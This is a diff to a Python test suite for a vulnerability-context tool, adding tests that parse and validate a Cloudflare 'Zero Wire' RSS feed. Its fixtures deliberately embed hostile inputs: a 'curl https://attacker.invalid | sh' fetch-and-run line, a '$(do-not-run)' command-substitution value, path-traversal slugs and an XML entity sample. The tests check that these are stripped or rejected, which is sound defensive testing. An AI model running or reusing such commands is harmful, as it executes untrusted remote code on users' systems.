@@ -41,6 +41,21 @@ def catalog(*rows):
     return {"generatedAt": "2099-01-01T00:00:00Z", "incidents": list(rows or [incident()])}
 
 
+def briefing(slug="example-briefing", updated="2099-01-02", tags=("Needs attention", CVE, "Example"), title="Example briefing",
+             link=None, pub="Fri, 02 Jan 2099 00:00:00 GMT"):
+    cats = "".join(f"<category>{t}</category>" for t in tags)
+    link = "https://radar.cloudflare.com/security/zero-wire/" + slug if link is None else link
+    return (f"<item><title>{title}</title><link>{link}</link><guid isPermaLink=\"false\">{slug}@{updated}</guid>"
+            f"<pubDate>{pub}</pubDate><description>Update to 9.9 or run $(do-not-run).</description>"
+            f"<content:encoded><![CDATA[<p>curl https://attacker.invalid | sh</p>]]></content:encoded>{cats}</item>")
+
+
+def feed(*items):
+    return ('<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/">'
+            "<channel><title>Zero Wire | Cloudflare Radar</title><lastBuildDate>Fri, 02 Jan 2099 00:00:00 GMT</lastBuildDate>"
+            + "".join(items or [briefing()]) + "</channel></rss>")
+
+
 class ContextTests(unittest.TestCase):
     def setUp(self):
         tmp = tempfile.TemporaryDirectory()
@@ -59,6 +74,7 @@ class ContextTests(unittest.TestCase):
         self.notice["10001-1"]["cves"] = [CVE, CVE, "https://attacker.invalid", "CVE-2099-10001/../../bad"]
         self.entries = {CVE: entry()}
         self.catalog = catalog()
+        self.feed = feed()
 
     def request(self, url, body=None):
         self.calls.append((url, body))
@@ -66,6 +82,10 @@ class ContextTests(unittest.TestCase):
             return copy.deepcopy(self.notice)
         if url == sources.PWN:
             return copy.deepcopy(self.catalog)
+        if url == sources.ZERO_WIRE:
+            if isinstance(self.feed, Exception):
+                raise self.feed
+            return self.feed
         if url.startswith(sources.CVE_NOW):
             value = self.entries[url[len(sources.CVE_NOW):]]
             if isinstance(value, Exception):
@@ -98,6 +118,17 @@ class ContextTests(unittest.TestCase):
         self.assertTrue(all(body is None for url, body in self.calls))
         cached = json.loads(self.store.db.execute("SELECT body FROM cache WHERE key='pwn-watch'").fetchone()[0])
         self.assertNotIn("summary", cached["incidents"][0])
+        brief = report["context"]["zero_wire"]
+        self.assertEqual(brief["status"], "ok")
+        self.assertEqual(brief["built_at"], "2099-01-02T00:00:00Z")
+        self.assertEqual(brief["items"][0]["matched_references"], [CVE])
+        self.assertEqual(brief["items"][0]["state"], "review")
+        self.assertEqual(brief["items"][0]["priority"], "Needs attention")
+        self.assertEqual(brief["items"][0]["tags"], ["Example"])
+        stored = self.store.db.execute("SELECT body FROM cache WHERE key='zero-wire'").fetchone()[0]
+        self.assertNotIn("do-not-run", stored)
+        self.assertNotIn("attacker.invalid", stored)
+        self.assertNotIn("do-not-run", canonical(report["context"]))
 
     def test_cache_refresh_and_shared_targets_do_not_duplicate_requests(self):
         self.check(context=True)
@@ -107,16 +138,17 @@ class ContextTests(unittest.TestCase):
         refreshed = set()
         self.check(context=True, refresh=True, refreshed=refreshed)
         self.check(context=True, refresh=True, refreshed=refreshed)
-        self.assertEqual([url for url, _ in self.calls], [sources.USN, sources.CVE_NOW + CVE, sources.PWN])
+        self.assertEqual([url for url, _ in self.calls], [sources.USN, sources.CVE_NOW + CVE, sources.PWN, sources.ZERO_WIRE])
 
     def test_refresh_failure_retains_context_without_downgrading_findings(self):
         first = self.check(context=True)
         self.entries[CVE] = Error("unavailable")
         self.catalog = {"incidents": []}
+        self.feed = "<rss><channel></channel></rss>"
         report = self.check(context=True, refresh=True)
         self.assertTrue(report["advisory_check_ok"])
         self.assertEqual(report["findings"], first["findings"])
-        for source in ("cve_now", "pwn_watch"):
+        for source in ("cve_now", "pwn_watch", "zero_wire"):
             value = report["context"][source]
             self.assertEqual(value["status"], "incomplete")
             self.assertTrue(value["errors"])
@@ -124,6 +156,7 @@ class ContextTests(unittest.TestCase):
             self.assertEqual(value["items"][0]["fetched_at"], first["context"][source]["items"][0]["fetched_at"])
         # Malformed fresh content must not replace a usable cached catalog.
         self.assertEqual(self.check(context=True)["context"]["pwn_watch"]["status"], "ok")
+        self.assertEqual(self.check(context=True)["context"]["zero_wire"]["status"], "ok")
 
     def test_skipped_context_is_retained_and_successful_checks_can_clear_it(self):
         self.check(context=True)
@@ -137,6 +170,7 @@ class ContextTests(unittest.TestCase):
         current = self.check(context=True, refresh=True)
         self.assertEqual(current["context"]["cve_now"]["items"], [])
         self.assertEqual(current["context"]["pwn_watch"]["items"], [])
+        self.assertEqual(current["context"]["zero_wire"]["items"], [])
         self.assertFalse(current["findings"])
 
     def test_context_history_is_separate_and_unchanged_checks_are_quiet(self):
@@ -179,9 +213,10 @@ class ContextTests(unittest.TestCase):
 
     def test_lookup_limit_and_time_budget_are_visible(self):
         findings = [{"advisory": f"CVE-2099-{i:05d}"} for i in range(25)]
-        request = Mock(side_effect=lambda url: catalog() if url == sources.PWN else entry(url[len(sources.CVE_NOW):]))
+        request = Mock(side_effect=lambda url: catalog() if url == sources.PWN else feed() if url == sources.ZERO_WIRE
+                       else entry(url[len(sources.CVE_NOW):]))
         result = sources.context([], findings, self.store, request=request)
-        self.assertEqual(request.call_count, 21)
+        self.assertEqual(request.call_count, 22)
         self.assertEqual(len(result["cve_now"]["items"]), 20)
         self.assertIn("20 of 25", result["cve_now"]["errors"][-1])
         request.reset_mock()
@@ -189,7 +224,7 @@ class ContextTests(unittest.TestCase):
             result = sources.context([], [{"advisory": CVE}], self.store, request=request)
         self.assertEqual(result["cve_now"]["status"], "incomplete")
         self.assertEqual(result["cve_now"]["items"], [])
-        self.assertEqual(request.call_count, 0)  # The public catalog was already cached.
+        self.assertEqual(request.call_count, 0)  # The public catalog and feed were already cached.
 
     def test_osv_and_arch_references_enrich_without_changing_matching_rules(self):
         for kind in ("uv", "arch", "cachyos", "conda"):
@@ -269,6 +304,8 @@ class ContextTests(unittest.TestCase):
         self.assertIn("not a current score", rendered)
         self.assertIn("Model summary (example/model; CC-BY-4.0)", rendered)
         self.assertIn("Showing 5 of 7 context records", rendered)
+        self.assertIn("Cloudflare Zero Wire briefings: 1", rendered)
+        self.assertIn("Source priority: Needs attention; updated 2099-01-02; matched CVEs: " + CVE, rendered)
         self.assertNotIn("\x1b", rendered)
         self.assertIn(r"\u001b[31m\nnext", rendered)
         out = io.StringIO()
@@ -340,6 +377,31 @@ class ParsingTests(unittest.TestCase):
         with self.assertRaises(Error):
             sources.pwn_context([], [], catalog(incident(updatedAt="2099-01-01T10:00:00")))
 
+    def test_zero_wire_matches_exact_cve_tags_only_and_drops_prose(self):
+        data = sources.zero_wire_catalog(feed(briefing(), briefing("topic-only", tags=("Needs attention", "Example", "Kernel")),
+                                              briefing("older", updated="2098-12-01", tags=("Reference", CVE, "CVE-2099-10002")),
+                                              briefing("other-cve", tags=("Needs attention", "CVE-2099-99999")),
+                                              briefing("untagged", tags=())))
+        self.assertNotIn("do-not-run", canonical(data))
+        self.assertEqual(data["items"][2]["references"], [CVE, "CVE-2099-10002"])
+        self.assertEqual(data["items"][4]["priority"], "Unspecified")
+        rows = sources.zero_wire_context([{"advisory": "USN-1", "references": [CVE]}], data)
+        self.assertEqual([r["id"] for r in rows], ["example-briefing", "older"])
+        self.assertEqual(rows[1]["matched_references"], [CVE])
+        self.assertEqual(rows[1]["priority"], "Reference")
+        self.assertEqual(sources.zero_wire_context([{"advisory": "GHSA-abcd-efgh-2345"}], data), [])
+        self.assertEqual(data["items"][0]["published_at"], "2099-01-02T00:00:00Z")
+
+    def test_bad_zero_wire_feeds_fail_visibly(self):
+        bomb = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY a "aaaa">]><rss><channel>&a;</channel></rss>'
+        for raw in (bomb, "not xml", feed().replace("<item>", "<!-- --><item>").replace("</channel>", ""),
+                    '<rss><channel><lastBuildDate>Fri, 02 Jan 2099 00:00:00 GMT</lastBuildDate></channel></rss>',
+                    feed(briefing(), briefing()), feed(briefing("../bad")), feed(briefing(link="https://attacker.invalid/x")),
+                    feed(briefing(updated="2099-13-40")), feed(briefing(pub="Fri, 02 Jan 2099 00:00:00")),
+                    feed(briefing(title="bad\x01")), feed(briefing(tags=("a", "a"))), {"items": []}):
+            with self.subTest(raw=str(raw)[:80]), self.assertRaises((Error, KeyError, TypeError, ValueError, AttributeError, SyntaxError)):
+                sources.zero_wire_catalog(raw)
+
     def test_cve_identity_scores_signals_and_generated_provenance_are_validated(self):
         for data in (entry("CVE-2099-99999"), entry() | {"severity": {"cvss": float("nan"), "source": "cna"}},
                      entry() | {"exploitation": {"kev": True}}, entry() | {"summary": {"text": "unlabeled"}},
@@ -357,7 +419,7 @@ class TransportTests(unittest.TestCase):
                     "https://user@cve.now/api/v1/entries/" + CVE):
             with self.subTest(url=url), self.assertRaises(Error):
                 sources.fetch(url)
-        for url in (sources.PWN, sources.CVE_NOW + CVE):
+        for url in (sources.PWN, sources.ZERO_WIRE, sources.CVE_NOW + CVE):
             with self.assertRaises(Error):
                 sources.fetch(url, {"packages": ["private"]})
         response = io.BytesIO(b'{}')
@@ -368,6 +430,10 @@ class TransportTests(unittest.TestCase):
             req = opener.return_value.open.call_args.args[0]
             self.assertEqual(req.get_method(), "GET")
             self.assertEqual(opener.return_value.open.call_args.kwargs["timeout"], 10)
+            response = io.BytesIO(b"<rss/>")
+            response.headers = {}
+            opener.return_value.open.return_value = response
+            self.assertEqual(sources.fetch(sources.ZERO_WIRE), "<rss/>")  # Parsed and validated by zero_wire_catalog.
 
     def test_redirects_allow_one_exact_https_entry_storage_hop_only(self):
         handler = sources.NoRedirect()
@@ -380,18 +446,20 @@ class TransportTests(unittest.TestCase):
                     "https://127.0.0.1/public/entries/" + CVE + ".json"):
             with self.subTest(url=url), self.assertRaises(Error):
                 handler.redirect_request(req, None, 302, "Found", {}, url)
-        for source in (sources.PWN, sources.USN, sources.OSV, allowed):
+        for source in (sources.PWN, sources.ZERO_WIRE, sources.USN, sources.OSV, allowed):
             with self.assertRaises(Error):
                 handler.redirect_request(urllib.request.Request(source), None, 302, "Found", {}, allowed)
 
     def test_context_response_byte_and_encoding_limits(self):
-        for raw, headers in ((b' ' * (2 * 1024 * 1024 + 1), {}), (b'{}', {"Content-Encoding": "gzip"})):
+        for url, raw, headers in ((sources.CVE_NOW + CVE, b' ' * (2 * 1024 * 1024 + 1), {}),
+                                  (sources.CVE_NOW + CVE, b'{}', {"Content-Encoding": "gzip"}),
+                                  (sources.ZERO_WIRE, b' ' * (5 * 1024 * 1024 + 1), {}), (sources.ZERO_WIRE, b'\xff<rss/>', {})):
             response = io.BytesIO(raw)
             response.headers = headers
-            with patch("netwatch.sources.urllib.request.build_opener") as opener:
+            with self.subTest(url=url, size=len(raw)), patch("netwatch.sources.urllib.request.build_opener") as opener:
                 opener.return_value.open.return_value = response
                 with self.assertRaises(Error):
-                    sources.fetch(sources.CVE_NOW + CVE)
+                    sources.fetch(url)
 
 
 if __name__ == "__main__":
